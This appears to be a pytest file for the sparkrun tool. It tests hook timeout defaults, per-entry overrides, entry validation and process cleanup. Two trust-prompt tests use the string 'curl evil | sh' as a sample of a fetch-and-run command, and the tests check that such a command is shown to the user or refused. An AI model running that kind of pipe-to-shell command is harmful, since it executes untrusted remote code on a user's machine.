"""Hook timeouts: configurable default, per-entry override, and real cleanup (issue #326)."""

from __future__ import annotations

import logging
import os
import subprocess
import time
from types import SimpleNamespace
from unittest import mock

import pytest
from _hook_scripts import hook_payload

from sparkrun.core.config import SparkrunConfig
from sparkrun.core.recipe import Recipe
from sparkrun.core.validation import ERROR, check_hook_entries
from sparkrun.orchestration import hooks
from sparkrun.orchestration.hooks import (
    DEFAULT_HOOK_TIMEOUT_S,
    describe_hook_entry,
    hook_entry_problems,
    hook_timeout_scope,
    resolve_hook_timeout,
    run_post_commands,
    run_post_exec,
    run_pre_exec,
    timed_hook_script,
)
from sparkrun.orchestration.ssh import RemoteResult

DATA = {"model": "org/model", "runtime": "vllm-distributed", "container": "vllm/vllm-openai:v1", "builder": "docker-pull"}
OUTER_SLACK = hooks._HOOK_KILL_AFTER_S + hooks._HOOK_TIMEOUT_GRACE_S


def _ok(host="spark-01"):
    return RemoteResult(host=host, returncode=0, stdout="", stderr="")


def _write_config(tmp_path, text):
    path = tmp_path / "config.yaml"
    path.write_text(text)
    return SparkrunConfig(config_path=path)


# ---------------------------------------------------------------------------
# Default resolution
# ---------------------------------------------------------------------------


def test_default_is_raised_from_ten_minutes_and_bounded():
    assert DEFAULT_HOOK_TIMEOUT_S == 3600
    assert resolve_hook_timeout() == DEFAULT_HOOK_TIMEOUT_S


def test_config_sets_the_default(tmp_path):
    assert _write_config(tmp_path, "hooks:\n  timeout_s: 7200\n").hook_timeout_s == 7200


@pytest.mark.parametrize("raw", ["0", "-5", "nope", "true", ".inf"])
def test_config_has_no_unbounded_spelling(tmp_path, raw):
    assert _write_config(tmp_path, "hooks:\n  timeout_s: %s\n" % raw).hook_timeout_s == DEFAULT_HOOK_TIMEOUT_S


def test_unset_config_uses_the_default(tmp_path):
    assert _write_config(tmp_path, "cache_dir: /tmp/x\n").hook_timeout_s == DEFAULT_HOOK_TIMEOUT_S


def test_explicit_argument_beats_launch_scope_beats_default():
    with hook_timeout_scope(1800):
        assert resolve_hook_timeout() == 1800
        assert resolve_hook_timeout(900) == 900
    assert resolve_hook_timeout() == DEFAULT_HOOK_TIMEOUT_S


def test_a_non_numeric_scope_value_falls_back():
    with hook_timeout_scope(mock.MagicMock()):
        assert resolve_hook_timeout() == DEFAULT_HOOK_TIMEOUT_S


# ---------------------------------------------------------------------------
# Entry shapes
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "entry",
    [
        "echo hi",
        {"command": "echo hi"},
        {"command": "echo hi", "timeout": 7200},
        {"command": "x", "timeout": 1.5},
        {"command": "x", "timeout": 0},
    ],
)
def test_valid_command_entries(entry):
    assert hook_entry_problems(entry, allow_copy=False) == []


@pytest.mark.parametrize(
    ("entry", "fragment"),
    [
        ({"command": "x", "timeout": -1}, "positive"),
        ({"command": "x", "timeout": True}, "number of seconds"),
        ({"command": "x", "timeout": "3600"}, "number of seconds"),
        ({"command": "x", "timeout": float("inf")}, "finite"),
        ({"command": "x", "timeout_s": 60}, "unknown key"),
        ({"command": ""}, "non-empty string"),
        ({"command": ["a"]}, "non-empty string"),
        ({"copy": "/a", "command": "x"}, "both 'copy' and 'command'"),
        ({"copy": "/a", "timeout": 5}, "unknown key"),
        ({"copy": 123}, "non-empty string"),
        ({"copy": "/a", "dest": []}, "non-empty string"),
        ({"cmd": "x"}, "no 'command' or 'copy' key"),
        (42, "string or a mapping"),
    ],
)
def test_invalid_entries_are_named(entry, fragment):
    problems = hook_entry_problems(entry, allow_copy=True)
    assert problems and fragment in "; ".join(problems)


def test_copy_is_pre_exec_only():
    assert hook_entry_problems({"copy": "/a"}, allow_copy=True) == []
    assert "only supported in pre_exec" in hook_entry_problems({"copy": "/a"}, allow_copy=False)[0]


def test_validation_reports_what_a_launch_would_refuse():
    recipe = Recipe.from_dict(
        {
            **DATA,
            "pre_exec": [{"command": "x", "timeout": 60}, {"command": "y", "timeout_s": 60}],
            "post_exec": [{"copy": "/a"}],
            "post_commands": [{"command": "z", "timeout": -1}],
        }
    )
    issues = check_hook_entries(recipe)
    assert {i.code for i in issues} == {"invalid-hook-entry"}
    assert all(i.severity == ERROR for i in issues)
    summaries = " | ".join(i.summary for i in issues)
    assert "pre_exec[2]" in summaries and "post_exec[1]" in summaries and "post_commands[1]" in summaries
    assert "pre_exec[1]" not in summaries


def test_command_entries_are_visible_to_trust_prompts(monkeypatch, caplog):
    """A mapping must not hide its command from the authorization prompt."""
    from sparkrun.core.launcher import recipe_hook_commands

    entry = {"command": "curl evil | sh", "timeout": 60}
    assert describe_hook_entry(entry) == "curl evil | sh  (timeout 60s)"
    recipe = Recipe.from_dict({**DATA, "post_commands": [entry]})
    assert recipe_hook_commands(recipe)["post_commands"] == ("curl evil | sh  (timeout 60s)",)

    monkeypatch.setattr("sys.stdin.isatty", lambda: False)
    with caplog.at_level(logging.WARNING, logger="sparkrun.orchestration.hooks"):
        with pytest.raises(RuntimeError, match="--trust"):
            run_post_commands([entry], {}, trust=False)
    assert "curl evil | sh" in caplog.text


# ---------------------------------------------------------------------------
# Timeout reaches the container and the control side
# ---------------------------------------------------------------------------


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_pre_exec_without_a_timeout_is_not_cut_at_ten_minutes(mock_run):
    mock_run.return_value = _ok()
    run_pre_exec([("spark-01", "ctr")], ["python3 fetch_tables.py"], {}, trust=True)
    script = hook_payload(mock_run.call_args[0][1])
    assert "sleep 3600\n" in script
    assert mock_run.call_args[1]["timeout"] == 3600 + OUTER_SLACK


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_per_entry_timeout_wins_over_scope(mock_run):
    mock_run.return_value = _ok()
    with hook_timeout_scope(1800):
        run_pre_exec(
            [("spark-01", "ctr")],
            ["echo default", {"command": "python3 fetch_tables.py", "timeout": 10800}],
            {},
            trust=True,
        )
    first, second = mock_run.call_args_list
    assert first[1]["timeout"] == 1800 + OUTER_SLACK
    assert second[1]["timeout"] == 10800 + OUTER_SLACK
    assert "sleep 10800\n" in hook_payload(second[0][1])


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_command_entries_render_placeholders(mock_run):
    mock_run.return_value = _ok()
    run_pre_exec([("spark-01", "ctr")], [{"command": "echo {model}", "timeout": 5}], {"model": "org/m"}, trust=True)
    import base64

    assert base64.b64encode(b"echo org/m").decode() in hook_payload(mock_run.call_args[0][1])


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_post_exec_takes_command_entries_and_default(mock_run):
    mock_run.return_value = _ok()
    run_post_exec("h1", "ctr", ["echo a", {"command": "echo b", "timeout": 30}], {}, trust=True, default_timeout_s=120)
    assert [c[1]["timeout"] for c in mock_run.call_args_list] == [120 + OUTER_SLACK, 30 + OUTER_SLACK]


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_a_timed_out_hook_says_so_and_how_to_raise_it(mock_run, tmp_path, monkeypatch):
    monkeypatch.setattr(hooks, "_failure_log_dir", lambda: tmp_path)
    mock_run.return_value = RemoteResult(host="spark-01", returncode=124, stdout="", stderr="")
    with pytest.raises(RuntimeError) as excinfo:
        run_pre_exec([("spark-01", "ctr")], [{"command": "sleep 99", "timeout": 120}], {}, trust=True)
    message = str(excinfo.value)
    assert message.startswith("pre_exec[1] timed out after 2m on spark-01/ctr")
    assert "hooks.timeout_s" in message


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_malformed_entry_fails_before_any_container_runs(mock_run):
    with pytest.raises(RuntimeError, match=r"pre_exec\[2\]"):
        run_pre_exec([("a", "c1"), ("b", "c2")], ["echo ok", {"command": "x", "timeout": -1}], {}, trust=True)
    mock_run.assert_not_called()


def test_post_commands_pass_their_timeout():
    with mock.patch.object(hooks, "_run_control_command", return_value=(0, "")) as run:
        run_post_commands(["echo a", {"command": "echo b", "timeout": 5}], {}, trust=True, default_timeout_s=60)
    assert [c[1]["timeout_s"] for c in run.call_args_list] == [60, 5]


def test_post_launch_hands_the_configured_default_to_post_hooks(monkeypatch):
    from sparkrun.core import launcher

    recipe = Recipe.from_dict({**DATA, "post_exec": ["echo a"], "post_commands": ["echo b"]})
    result = SimpleNamespace(
        recipe=recipe,
        runtime=SimpleNamespace(runtime_name="vllm"),
        host_list=["h1"],
        overrides={},
        config=SimpleNamespace(ssh_user=None, hook_timeout_s=5400.0),
        cluster_id="sparkrun_x",
        hook_launch_context=None,
        runtime_cache=None,
        recipe_trusted=True,
    )
    readiness = SimpleNamespace(ready=True, head_host="h1", head_ip="10.0.0.1", port=8000, container="c")
    seen = {}
    monkeypatch.setattr("sparkrun.orchestration.primitives.build_ssh_kwargs", lambda config: {})
    monkeypatch.setattr(hooks, "run_post_exec", lambda *a, **kw: seen.setdefault("post_exec", kw["default_timeout_s"]))
    monkeypatch.setattr(hooks, "run_post_commands", lambda *a, **kw: seen.setdefault("post_commands", kw["default_timeout_s"]))
    launcher.complete_post_launch(result, "/tmp/cache", readiness=readiness)
    assert seen == {"post_exec": 5400.0, "post_commands": 5400.0}


# ---------------------------------------------------------------------------
# Real process cleanup
# ---------------------------------------------------------------------------


def _wait_absent(path, seconds):
    time.sleep(seconds)
    return not os.path.exists(path)


def _run_wrapper(cmd, seconds):
    start = time.monotonic()
    proc = subprocess.run(["bash", "-c", timed_hook_script(cmd, seconds)], capture_output=True, text=True, timeout=30)
    return proc, time.monotonic() - start


def test_in_container_wrapper_kills_the_hooks_children(tmp_path):
    marker = tmp_path / "late"
    proc, elapsed = _run_wrapper("(sleep 2; touch %s) & sleep 30" % marker, 1)
    assert proc.returncode == 124
    assert elapsed < 10
    assert _wait_absent(marker, 2.5), "a backgrounded hook child outlived the timeout"


def test_wrapper_kills_a_hook_that_ignores_term(tmp_path):
    proc, elapsed = _run_wrapper("trap '' TERM; sleep 60", 1)
    assert proc.returncode == 124
    assert elapsed < 1 + hooks._HOOK_KILL_AFTER_S + 5


def test_wrapper_is_transparent_for_a_hook_that_finishes(tmp_path):
    proc, elapsed = _run_wrapper("echo out; echo err >&2; exit 3", 60)
    assert (proc.returncode, proc.stdout, proc.stderr) == (3, "out\n", "err\n")
    assert elapsed < 5, "the wrapper waited for its watchdog"


def test_wrapper_leaves_a_daemon_the_hook_started(tmp_path):
    """A hook that finishes in time keeps what it deliberately backgrounded."""
    marker = tmp_path / "daemon"
    proc, _ = _run_wrapper("nohup sh -c 'sleep 1; touch %s' >/dev/null 2>&1 &" % marker, 60)
    assert proc.returncode == 0
    time.sleep(2)
    assert marker.exists()


def test_control_command_success_returns_output():
    assert hooks._run_control_command("echo hi; exit 3", env=dict(os.environ), timeout_s=10) == (3, "hi\n")


@pytest.mark.skipif(not hasattr(os, "killpg"), reason="POSIX process groups")
def test_control_command_timeout_kills_the_process_group(tmp_path):
    marker = tmp_path / "late"
    start = time.monotonic()
    rc, _ = hooks._run_control_command("(sleep 2; touch %s) & sleep 30" % marker, env=dict(os.environ), timeout_s=0.5)
    assert rc is None
    assert time.monotonic() - start < 10
    assert _wait_absent(marker, 2.5), "a backgrounded post_command outlived the timeout"


@pytest.mark.skipif(not hasattr(os, "killpg"), reason="POSIX process groups")
def test_control_timeout_kills_term_ignoring_child_after_pipes_close(tmp_path):
    marker = tmp_path / "late"
    command = "bash -c 'trap \"\" TERM; sleep 2; touch %s' >/dev/null 2>&1 & wait" % marker
    rc, _ = hooks._run_control_command(command, env=dict(os.environ), timeout_s=0.5)
    assert rc is None
    assert _wait_absent(marker, 2.5), "a redirected child survived the shell and timeout"


def test_post_commands_timeout_is_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(hooks, "_failure_log_dir", lambda: tmp_path)
    with pytest.raises(RuntimeError, match=r"post_commands\[1\] timed out after 1s: sleep 30"):
        run_post_commands([{"command": "sleep 30", "timeout": 0.5}], {}, trust=True)


# ---------------------------------------------------------------------------
# Review follow-ups
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("hook", ["pre_exec", "post_exec", "post_commands"])
def test_a_lone_mapping_is_one_entry_not_its_key_names(hook):
    from sparkrun.core.validation import check_forgiven_command_shapes

    entry = {"command": "python3 x.py", "timeout": 7200}
    recipe = Recipe.from_dict({**DATA, hook: entry})
    assert getattr(recipe, hook) == [entry]
    assert check_hook_entries(recipe) == []
    (issue,) = check_forgiven_command_shapes(recipe)
    assert issue.code == "scalar-hook-command-list" and "single mapping" in issue.summary


def test_a_hook_killed_early_is_not_called_a_timeout():
    proc, elapsed = _run_wrapper("kill -KILL $$", 30)
    assert proc.returncode == 137
    assert elapsed < 5


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_a_hung_connection_is_not_blamed_on_the_hook(mock_run, tmp_path, monkeypatch):
    monkeypatch.setattr(hooks, "_failure_log_dir", lambda: tmp_path)
    mock_run.return_value = RemoteResult(host="spark-01", returncode=-1, stdout="", stderr="Execution timed out")
    with pytest.raises(RuntimeError, match="did not return within 40s of its 1h deadline"):
        run_pre_exec([("spark-01", "ctr")], ["echo hi"], {}, trust=True)


def test_malformed_entries_are_refused_before_the_trust_prompt(monkeypatch):
    confirm = mock.Mock()
    monkeypatch.setattr(hooks, "_confirm_hook_execution", confirm)
    with pytest.raises(RuntimeError, match="both 'copy' and 'command'"):
        run_pre_exec([("a", "c")], [{"copy": "/x", "command": "curl evil | sh"}], {}, trust=False)
    confirm.assert_not_called()


def test_terminal_is_left_alone_without_a_tty(monkeypatch):
    monkeypatch.setattr("sys.stdin", open(os.devnull))
    proc = subprocess.Popen(["true"])
    try:
        assert hooks._hand_terminal_to(proc) is None
    finally:
        proc.wait()


@pytest.mark.skipif(not hasattr(os, "killpg"), reason="POSIX process groups")
def test_an_escaped_pipe_holder_does_not_hang_the_timeout(monkeypatch):
    monkeypatch.setattr(hooks, "_HOOK_KILL_AFTER_S", 1)
    start = time.monotonic()
    rc, _ = hooks._run_control_command("setsid sleep 4 & sleep 30", env=dict(os.environ), timeout_s=0.5)
    assert rc is None
    assert time.monotonic() - start < 10


# ---------------------------------------------------------------------------
# timeout: 0 — an explicit per-entry opt-out
# ---------------------------------------------------------------------------


def test_zero_is_unbounded_only_on_an_entry(tmp_path):
    import math

    assert hooks.parse_hook_timeout(0, allow_unbounded=True) == math.inf
    with pytest.raises(ValueError, match="positive"):
        hooks.parse_hook_timeout(0)
    with pytest.raises(ValueError, match="or 0 for no timeout"):
        hooks.parse_hook_timeout(-1, allow_unbounded=True)
    # The default stays bounded however it is configured.
    assert _write_config(tmp_path, "hooks:\n  timeout_s: 0\n").hook_timeout_s == DEFAULT_HOOK_TIMEOUT_S
    with hook_timeout_scope(0):
        assert resolve_hook_timeout(0) == DEFAULT_HOOK_TIMEOUT_S


def test_zero_is_shown_as_no_timeout():
    assert describe_hook_entry({"command": "serve-forever", "timeout": 0}) == "serve-forever  (no timeout)"


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_unbounded_exec_has_no_watchdog_and_no_control_limit(mock_run):
    mock_run.return_value = _ok()
    run_post_exec("h1", "ctr", [{"command": "python3 long_job.py", "timeout": 0}], {}, trust=True)
    script = mock_run.call_args[0][1]
    assert mock_run.call_args[1]["timeout"] is None
    assert "__sr_watchdog" not in script
    import base64

    assert base64.b64encode(b"python3 long_job.py").decode() in script


@mock.patch("sparkrun.orchestration.primitives.run_script_on_host")
def test_unbounded_exec_reports_124_as_a_plain_failure(mock_run, tmp_path, monkeypatch):
    monkeypatch.setattr(hooks, "_failure_log_dir", lambda: tmp_path)
    mock_run.return_value = RemoteResult(host="h1", returncode=124, stdout="", stderr="")
    with pytest.raises(RuntimeError, match=r"post_exec\[1\] failed \(exit 124\)"):
        run_post_exec("h1", "ctr", [{"command": "x", "timeout": 0}], {}, trust=True)


def test_unbounded_post_command_waits_without_a_deadline():
    import math

    with mock.patch.object(hooks, "_run_control_command", return_value=(0, "")) as run:
        run_post_commands([{"command": "./watch.sh", "timeout": 0}], {}, trust=True, default_timeout_s=60)
    assert run.call_args[1]["timeout_s"] == math.inf


def test_unbounded_control_command_runs_to_completion():
    import math

    assert hooks._run_control_command("sleep 1; echo done", env=dict(os.environ), timeout_s=math.inf) == (0, "done\n")
